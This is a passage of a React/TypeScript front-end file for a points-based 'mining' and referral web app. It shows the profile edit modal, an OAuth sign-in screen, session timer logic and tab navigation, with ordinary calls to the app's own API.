                <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">{row.label}</span>
                <span className="max-w-[60%] truncate text-sm text-white/70">{row.value}</span>
              </div>
            ))}
          </div>
        </div>

        <div className="glass-panel p-8">
          <div className="flex items-start justify-between gap-4">
            <div>
            <h3 className="text-serif text-3xl">Current setup</h3>
            <p className="mt-2 text-sm text-white/40">
              Your privacy, alerts, and refresh settings work best when they stay aligned.
            </p>
            </div>
            <Globe size={18} className="text-realm-cyan" />
          </div>

          <div className="mt-6 space-y-4">
            {[
              {
                icon: TimerReset,
                label: 'Refresh cadence',
                value: formatRefreshInterval(preferences.workspace.refreshIntervalMs),
                detail: 'Applied to live workspace polling.',
              },
              {
                icon: preferences.workspace.hidePointBalance ? EyeOff : Eye,
                label: 'Balance visibility',
                value: preferences.workspace.hidePointBalance ? 'Masked' : 'Visible',
                detail: 'Controls exposed point totals in shared views.',
              },
              {
                icon: preferences.notifications.securityAlerts ? Siren : Lock,
                label: 'Security notice feed',
                value: preferences.notifications.securityAlerts ? 'Active' : 'Muted',
                detail: 'Used for identity-risk and recovery warnings.',
              },
            ].map((item) => {
              const Icon = item.icon;
              return (
                <div key={item.label} className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                  <div className="flex items-center gap-3">
                    <div className="flex h-9 w-9 items-center justify-center rounded-xl border border-white/10 bg-white/[0.03]">
                      <Icon size={16} className="text-realm-cyan" />
                    </div>
                    <div>
                      <p className="text-sm font-medium text-white">{item.label}</p>
                      <p className="text-xs font-mono text-white/35">{item.value}</p>
                    </div>
                  </div>
                  <p className="mt-3 text-sm text-white/50">{item.detail}</p>
                </div>
              );
            })}
          </div>
        </div>
      </div>

      {showEditModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="bg-realm-surface border border-realm-border p-8 rounded-xl w-[400px] max-w-[90vw] flex flex-col gap-6">
            <div className="flex justify-between items-center border-b border-white/5 pb-4">
              <h2 className="text-xl font-bold text-white">Edit profile</h2>
              <button onClick={() => setShowEditModal(false)} className="text-white/40 hover:text-white text-2xl">&times;</button>
            </div>
            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-[10px] text-white/40 font-mono uppercase">Display Name</label>
                <input
                  type="text"
                  value={editName}
                  onChange={(e) => setEditName(e.target.value)}
                  className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-white/20 focus:border-realm-cyan outline-none transition-all"
                  placeholder="Your display name"
                />
              </div>
              <div className="space-y-2">
                <label className="text-[10px] text-white/40 font-mono uppercase">Username</label>
                <input
                  type="text"
                  value={editUsername}
                  onChange={(e) => setEditUsername(e.target.value)}
                  className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-white/20 focus:border-realm-cyan outline-none transition-all"
                  placeholder="your_username"
                />
              </div>
              <div className="space-y-2">
                <label className="text-[10px] text-white/40 font-mono uppercase">Profile Photo</label>
                <input type="file" ref={fileInputRef} accept="image/*" onChange={handleFileUpload} className="hidden" />
                <div className="flex items-center gap-3">
                  {editAvatar && <img src={editAvatar} alt="Preview" className="w-12 h-12 rounded-lg object-cover border border-white/10" />}
                  <button
                    type="button"
                    onClick={() => fileInputRef.current?.click()}
                    className="px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white/60 hover:text-white hover:border-realm-cyan transition-all"
                  >
                    {editAvatar ? 'Change photo' : 'Upload photo'}
                  </button>
                  {editAvatar && (
                    <button type="button" onClick={() => setEditAvatar('')} className="text-xs text-red-400 hover:text-red-300">
                      Remove
                    </button>
                  )}
                </div>
              </div>
            </div>
            <div className="flex gap-4 mt-4">
              <button onClick={() => setShowEditModal(false)} className="flex-1 py-3 text-xs font-bold text-white/60 hover:text-white border border-white/10 rounded-xl transition-colors">
                Cancel
              </button>
              <button
                onClick={async () => {
                  try {
                    const res = await fetch('/api/users/me', {
                      method: 'PUT',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ name: editName, avatarUrl: editAvatar, username: editUsername }),
                      credentials: 'include',
                    });
                    const data = await res.json().catch(() => ({}));
                    if (!res.ok) {
                      throw new Error(data.error || 'Failed to update profile');
                    }
                    setUser(data);
                    setEditAvatar(data.avatarUrl || '');
                    setShowEditModal(false);
                    setProfileMessage({ type: 'success', text: 'Profile identity updated.' });
                  } catch (e: any) {
                    setProfileMessage({ type: 'error', text: e?.message || 'Failed to update profile' });
                  }
                }}
                className="flex-1 py-3 bg-realm-cyan text-realm-black text-xs font-bold rounded-xl hover:shadow-[0_0_15px_rgba(61,242,224,0.3)] transition-all"
              >
                Save Changes
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const AuthGateScreen = ({ loading }: { loading: boolean }) => {
  const returnTo = encodeURIComponent(getDefaultAuthReturnTo());

  return (
    <div className="min-h-screen bg-realm-black text-white overflow-hidden">
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(61,242,224,0.12),transparent_38%),radial-gradient(circle_at_bottom,rgba(255,255,255,0.06),transparent_34%)]" />
        <div className="absolute inset-0 grid-distortion opacity-20" />
      </div>

      <div className="relative flex min-h-screen items-center justify-center px-5 py-8">
        <div className="w-full max-w-[460px] rounded-[34px] border border-white/14 bg-white/[0.07] p-8 shadow-[0_30px_100px_rgba(0,0,0,0.42)] backdrop-blur-[24px]">
          <div className="text-center">
            <div className="inline-flex items-center rounded-full border border-white/12 bg-white/[0.06] px-3.5 py-1.5 text-[10px] font-mono uppercase tracking-[0.24em] text-white/55">
              REALMxAI
            </div>
            <h1 className="mt-4 text-[2.05rem] font-semibold tracking-tight text-white">
              Sign in
            </h1>
            <p className="mt-2 text-sm text-white/45">
              Choose a provider to connect your node access.
            </p>
          </div>

          <div className="mt-7 space-y-3">
            <a
              href={`/api/auth/google?returnTo=${returnTo}`}
              className="flex min-h-16 w-full items-center justify-between rounded-[24px] border border-white/14 bg-white/[0.9] px-5 text-realm-black transition-all hover:-translate-y-0.5 hover:bg-white"
            >
              <span className="flex items-center gap-4">
                <span className="flex h-11 w-11 items-center justify-center rounded-2xl bg-white shadow-[inset_0_1px_0_rgba(255,255,255,0.7)]">
                  <img src="/icons8-google-30.webp" alt="Google" className="h-6 w-6 object-contain" />
                </span>
                <span className="flex flex-col text-left">
                  <span className="text-base font-semibold text-realm-black">Google</span>
                  <span className="text-xs text-realm-black/60">Connect with Google</span>
                </span>
              </span>
              <span className="rounded-full bg-realm-black px-3 py-1 text-[11px] font-semibold uppercase tracking-[0.16em] text-white">
                Connect
              </span>
            </a>

            <a
              href={`/api/auth/twitter?returnTo=${returnTo}`}
              aria-label="Continue with X"
              className="flex min-h-16 w-full items-center justify-between rounded-[24px] border border-white/14 bg-white/[0.9] px-5 text-realm-black transition-all hover:-translate-y-0.5 hover:bg-white"
            >
              <span className="flex items-center gap-4">
                <span className="flex h-11 w-11 items-center justify-center rounded-2xl bg-white shadow-[inset_0_1px_0_rgba(255,255,255,0.7)]">
                  <img src="/icons8-x-30.webp" alt="X" className="h-6 w-6 object-contain" />
                </span>
                <span className="flex flex-col text-left">
                  <span className="text-base font-semibold text-realm-black">X</span>
                  <span className="text-xs text-realm-black/60">Connect with X</span>
                </span>
              </span>
              <span className="rounded-full bg-realm-black px-3 py-1 text-[11px] font-semibold uppercase tracking-[0.16em] text-white">
                Connect
              </span>
            </a>

            <a
              href={`/api/auth/discord?returnTo=${returnTo}`}
              aria-label="Continue with Discord"
              className="flex min-h-16 w-full items-center justify-between rounded-[24px] border border-white/14 bg-white/[0.9] px-5 text-realm-black transition-all hover:-translate-y-0.5 hover:bg-white"
            >
              <span className="flex items-center gap-4">
                <span className="flex h-11 w-11 items-center justify-center rounded-2xl bg-white shadow-[inset_0_1px_0_rgba(255,255,255,0.7)]">
                  <img src="/icons8-discord-30.webp" alt="Discord" className="h-6 w-6 object-contain" />
                </span>
                <span className="flex flex-col text-left">
                  <span className="text-base font-semibold text-realm-black">Discord</span>
                  <span className="text-xs text-realm-black/60">Connect with Discord</span>
                </span>
              </span>
              <span className="rounded-full bg-realm-black px-3 py-1 text-[11px] font-semibold uppercase tracking-[0.16em] text-white">
                Connect
              </span>
            </a>

            <a
              href={`/api/auth/github?returnTo=${returnTo}`}
              aria-label="Continue with GitHub"
              className="flex min-h-16 w-full items-center justify-between rounded-[24px] border border-white/14 bg-white/[0.9] px-5 text-realm-black transition-all hover:-translate-y-0.5 hover:bg-white"
            >
              <span className="flex items-center gap-4">
                <span className="flex h-11 w-11 items-center justify-center rounded-2xl bg-white shadow-[inset_0_1px_0_rgba(255,255,255,0.7)]">
                  <img src="/icons8-github-48.png" alt="GitHub" className="h-6 w-6 object-contain" />
                </span>
                <span className="flex flex-col text-left">
                  <span className="text-base font-semibold text-realm-black">GitHub</span>
                  <span className="text-xs text-realm-black/60">Connect with GitHub</span>
                </span>
              </span>
              <span className="rounded-full bg-realm-black px-3 py-1 text-[11px] font-semibold uppercase tracking-[0.16em] text-white">
                Connect
              </span>
            </a>
          </div>

          {loading && (
            <div className="mt-4 text-center text-[10px] font-mono uppercase tracking-[0.18em] text-white/30">
              Restoring session
            </div>
          )}
        </div>
      </div>
    </div>
  );
};


function AuthenticatedApp() {
  const [activeTab, setActiveTab] = useState(() => {
    const tab = new URLSearchParams(window.location.search).get('tab');
    const allowedTabs = new Set(['dashboard', 'leaderboard', 'node', 'mining', 'wallet', 'tasks', 'referrals', 'profile', 'settings']);
    return tab && allowedTabs.has(tab) ? tab : 'dashboard';
  });
  // ---- Shared Mining Session State ----
  const [miningActive, setMiningActive] = useState<boolean>(() => isSessionActive());
  const [sessionSecs, setSessionSecs] = useState<number>(() => getSessionElapsed());
  const [parallaxOffset, setParallaxOffset] = useState(0);
  const [smoothScrollReady, setSmoothScrollReady] = useState(false);
  const smoothScrollViewportRef = useRef<HTMLDivElement>(null);
  const smoothScrollContainerRef = useRef<HTMLElement>(null);
  const smoothScrollEnabledRef = useRef(false);

  useEffect(() => {
    const pendingReferralCode = getPendingReferralCode();
    if (!pendingReferralCode) return;

    persistPendingReferralCode(pendingReferralCode);
    clearReferralCodeFromUrl();
  }, []);

  useEffect(() => {
    let cancelled = false;

    const syncPendingReferral = async () => {
      const pendingReferralCode = getPendingReferralCode();
      if (!pendingReferralCode) {
        return;
      }

      try {
        const meRes = await fetch('/api/auth/me', { credentials: 'include' });
        if (!meRes.ok) {
          return;
        }

        const me = await meRes.json();
        if (cancelled || !me?.id) {
          return;
        }

        const referralRes = await fetch('/api/referral', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          credentials: 'include',
          body: JSON.stringify({ code: pendingReferralCode }),
        });

        const referralData = await referralRes.json().catch(() => ({}));
        if (cancelled) return;

        if (referralRes.ok) {
          persistPendingReferralCode(null);
          window.dispatchEvent(new Event('balance-updated'));
          return;
        }

        const errorMessage = String(referralData?.error || '').toLowerCase();
        if (errorMessage.includes('already referred') || errorMessage.includes('cannot refer yourself')) {
          persistPendingReferralCode(null);
        }
      } catch {
        // Leave the stored referral intact so it can be retried after the next successful auth/session load.
      }
    };

    syncPendingReferral();

    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    let cancelled = false;

    const hydrateMiningState = async () => {
      try {
        const res = await fetch('/api/mining/status', { credentials: 'include' });
        if (res.status === 401) {
          if (!cancelled) {
            setMiningActive(false);
            setSessionSecs(0);
            localStorage.removeItem('realmx_mining_session');
          }
          return;
        }

        if (!res.ok) {
          return;
        }

        const data = await res.json();
        if (cancelled) {
          return;
        }

        if (data.active) {
          const startedAtMs = data.startedAt ? new Date(data.startedAt).getTime() : Date.now() - (data.sessionSeconds || 0) * 1000;
          setMiningActive(true);
          setSessionSecs(data.sessionSeconds || 0);
          saveMiningSession({ startedAt: startedAtMs, active: true });
          return;
        }

        setMiningActive(false);
        setSessionSecs(0);
        localStorage.removeItem('realmx_mining_session');
        window.dispatchEvent(new Event('balance-updated'));
      } catch {
        // Keep the optimistic local session as a fallback if the status call fails.
      }
    };

    hydrateMiningState();

    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (!miningActive) return;
    const timer = setInterval(() => {
      setSessionSecs(prev => {
        const next = prev + 1;
        
        // Hourly distribution check
        if (next % 3600 === 0 && next > 0) {
          const syncMining = async () => {
             const API_URL = '';
             await fetch(`${API_URL}/api/mining/sync`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ sessionSeconds: next }),
               credentials: 'include'
             });
          };
          syncMining();
        }

        if (next >= SESSION_DURATION) {
          // Session expired
          setMiningActive(false);
          localStorage.removeItem('realmx_mining_session');
          
          // Final sync
          const finalSync = async () => {
            const API_URL = '';
            await fetch(`${API_URL}/api/mining/sync`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sessionSeconds: SESSION_DURATION, stopMining: true }),
              credentials: 'include'
            });
            window.dispatchEvent(new Event('balance-updated'));
          };
          finalSync();

          return SESSION_DURATION;
        }
        return next;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [miningActive]);

  useEffect(() => {
    window.scrollTo({ top: 0, left: 0, behavior: 'auto' });
  }, [activeTab]);

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const viewport = smoothScrollViewportRef.current;
    const container = smoothScrollContainerRef.current;
    if (!viewport || !container) return;

    const mediaQuery = window.matchMedia('(max-width: 767px), (prefers-reduced-motion: reduce)');
    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    if (mediaQuery.matches || isTouchDevice) {
      smoothScrollEnabledRef.current = false;
      setSmoothScrollReady(false);
      return;
    }

    let cancelled = false;
    let resizeObserver: ResizeObserver | null = null;

    const activateSmoothScroll = async () => {
      try {
        const SmoothScroll = await loadUploadedSmoothScroll();
        if (cancelled || !SmoothScroll) return;

        smoothScrollEnabledRef.current = true;
        setSmoothScrollReady(true);

        const instance = new SmoothScroll({
          target: container,
          scrollEase: 0.08,
          maxOffset: 220,
        });

        instance.addItems?.();
        window.dispatchEvent(new Event('resize'));

        resizeObserver = new ResizeObserver(() => {
          window.dispatchEvent(new Event('resize'));
        });
        resizeObserver.observe(container);
      } catch (error) {
        console.error('[REALMxAI] Failed to enable uploaded smooth scroll:', error);
      }
    };

    void activateSmoothScroll();

    return () => {
      cancelled = true;
      resizeObserver?.disconnect();
      smoothScrollEnabledRef.current = false;
      setSmoothScrollReady(false);
      container.style.transform = '';
      document.body.style.height = '';
    };
  }, []);

  useEffect(() => {
    if (!smoothScrollEnabledRef.current || typeof window === 'undefined') return;

    const rafId = window.requestAnimationFrame(() => {
      window.dispatchEvent(new Event('resize'));
    });

    return () => window.cancelAnimationFrame(rafId);
  }, [activeTab]);

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const mediaQuery = window.matchMedia('(max-width: 767px), (prefers-reduced-motion: reduce)');
    let rafId = 0;

    const updateOffset = () => {
      if (mediaQuery.matches) {
        setParallaxOffset(0);
        return;
      }

      setParallaxOffset(window.scrollY || window.pageYOffset || 0);
    };

    const handleScroll = () => {
      if (rafId) return;

      rafId = window.requestAnimationFrame(() => {
        rafId = 0;
        updateOffset();
      });
    };

    const handleMediaChange = () => {
      if (rafId) {
        window.cancelAnimationFrame(rafId);
        rafId = 0;
      }
      updateOffset();
    };

    updateOffset();
    window.addEventListener('scroll', handleScroll, { passive: true });
    window.addEventListener('resize', handleMediaChange);
    if (mediaQuery.addEventListener) {
      mediaQuery.addEventListener('change', handleMediaChange);
    } else {
      mediaQuery.addListener(handleMediaChange);
    }

    return () => {
      if (rafId) {
        window.cancelAnimationFrame(rafId);
      }
      window.removeEventListener('scroll', handleScroll);
      window.removeEventListener('resize', handleMediaChange);
      if (mediaQuery.removeEventListener) {
        mediaQuery.removeEventListener('change', handleMediaChange);
      } else {
        mediaQuery.removeListener(handleMediaChange);
      }
    };
  }, []);


  const handleMiningAction = async () => {
    if (miningActive) {
      const elapsedSecs = sessionSecs;
      try {
        const res = await fetch('/api/mining/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionSeconds: elapsedSecs, stopMining: true }),
          credentials: 'include'
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
          throw new Error(data.message || data.error || 'Unable to stop mining session');
        }
        setMiningActive(false);
        setSessionSecs(0);
        localStorage.removeItem('realmx_mining_session');
        window.dispatchEvent(new Event('balance-updated'));
      } catch (e: any) {
        alert(e?.message || 'Failed to stop mining session.');
      }
      return;
    }

    try {
      const res = await fetch('/api/mining/start', {
        method: 'POST',
        credentials: 'include'
      });
      if (res.status === 401) {
        throw new Error('Sign in first to start mining and earn points.');
      }
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        throw new Error(data.message || data.error || 'Unable to start mining session');
      }
      const now = Date.now();
      setMiningActive(true);
      setSessionSecs(0);
      saveMiningSession({ startedAt: now, active: true });
    } catch (e: any) {
      alert(e?.message || 'Failed to start mining session.');
    }
  };

  return (
    <div className="min-h-screen bg-realm-black selection:bg-realm-cyan selection:text-realm-black overflow-x-hidden">
      {/* Background Effects */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div
          className="absolute -top-32 right-[4%] h-[28rem] w-[28rem] rounded-full bg-[radial-gradient(circle,rgba(47,230,210,0.14)_0%,rgba(47,230,210,0.07)_32%,transparent_72%)] blur-3xl will-change-transform"
          style={{ transform: `translate3d(0, ${Math.round(parallaxOffset * 0.14)}px, 0)` }}
        />
        <div
          className="absolute left-[-9rem] top-[28%] h-[22rem] w-[22rem] rounded-full bg-[radial-gradient(circle,rgba(255,255,255,0.10)_0%,rgba(255,255,255,0.03)_36%,transparent_72%)] blur-3xl will-change-transform"
          style={{ transform: `translate3d(0, ${Math.round(parallaxOffset * -0.08)}px, 0)` }}
        />
        <div
          className="absolute inset-x-0 top-0 h-64 bg-[linear-gradient(180deg,rgba(255,255,255,0.03),transparent)] will-change-transform"
          style={{ transform: `translate3d(0, ${Math.round(parallaxOffset * 0.05)}px, 0)` }}
        />
        <div className="absolute inset-0 grid-distortion opacity-20" />
      </div>

      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
      <TopBar onNavigate={(t) => setActiveTab(t)} />

      <div
        ref={smoothScrollViewportRef}
        className={smoothScrollReady ? 'fixed inset-0 overflow-hidden' : undefined}
      >
        <main
          ref={smoothScrollContainerRef}
          className={`pl-0 md:pl-64 pt-20 min-h-screen ${smoothScrollReady ? 'w-full' : ''}`}
        >
          <div className="mx-auto max-w-[1120px] px-4 py-6 sm:px-6 lg:px-7 xl:px-8 xl:py-10">
            <AnimatePresence mode="wait">
              <motion.div
                key={activeTab}
                initial={{ opacity: 0, x: 10 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -10 }}
                transition={{ duration: 0.3, ease: "easeOut" }}
              >
                {activeTab === 'dashboard' && <Dashboard miningActive={miningActive} sessionSecs={sessionSecs} onToggleMining={handleMiningAction} onNavigate={(t) => setActiveTab(t)} />}
                {activeTab === 'leaderboard' && <Leaderboard />}
                {activeTab === 'node' && <NodePage />}
                {activeTab === 'mining' && <MiningPage miningActive={miningActive} sessionSecs={sessionSecs} onToggleMining={handleMiningAction} />}
                {activeTab === 'wallet' && <WalletPage />}
                {activeTab === 'tasks' && <TasksPageV2 onNavigate={(t) => setActiveTab(t)} />}
                {activeTab === 'referrals' && <ReferralsPage />}
                {activeTab === 'profile' && <Profile />}
                {activeTab === 'settings' && <SettingsPage />}
              </motion.div>
            </AnimatePresence>
          </div>
        </main>
      </div>

      {/* Cinematic Grain Overlay */}
      <div className="fixed inset-0 pointer-events-none z-[100] opacity-[0.03] mix-blend-overlay">
        <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
          <filter id="noiseFilter">
            <feTurbulence type="fractalNoise" baseFrequency="0.65" numOctaves="3" stitchTiles="stitch" />
          </filter>
          <rect width="100%" height="100%" filter="url(#noiseFilter)" />
        </svg>
      </div>
    </div>
  );
}

export default function App() {
  const [authUser, setAuthUser] = useState<SessionUser>(null);
  const [authReady, setAuthReady] = useState(false);

  useEffect(() => {
    let cancelled = false;

    const hydrateAuth = async () => {
      const user = await resolveCurrentSessionUser();
      if (cancelled) return;
      setAuthUser(user);
      setAuthReady(true);
    };

    hydrateAuth();

    const refreshAuth = () => {
      void hydrateAuth();
    };

    window.addEventListener('focus', refreshAuth);
    window.addEventListener('visibilitychange', refreshAuth);

    return () => {
      cancelled = true;
      window.removeEventListener('focus', refreshAuth);
      window.removeEventListener('visibilitychange', refreshAuth);
    };
  }, []);

  useEffect(() => {
    if (!authReady || authUser?.id) return;

    const intervalId = window.setInterval(async () => {
      const user = await resolveCurrentSessionUser();
      if (user?.id) {
        setAuthUser(user);
      }
    }, 2500);

    return () => window.clearInterval(intervalId);
  }, [authReady, authUser]);

  if (!authReady) {
    return <AuthGateScreen loading={true} />;
  }

  if (!authUser?.id) {
    return <AuthGateScreen loading={false} />;
  }

  return <AuthenticatedApp />;
}
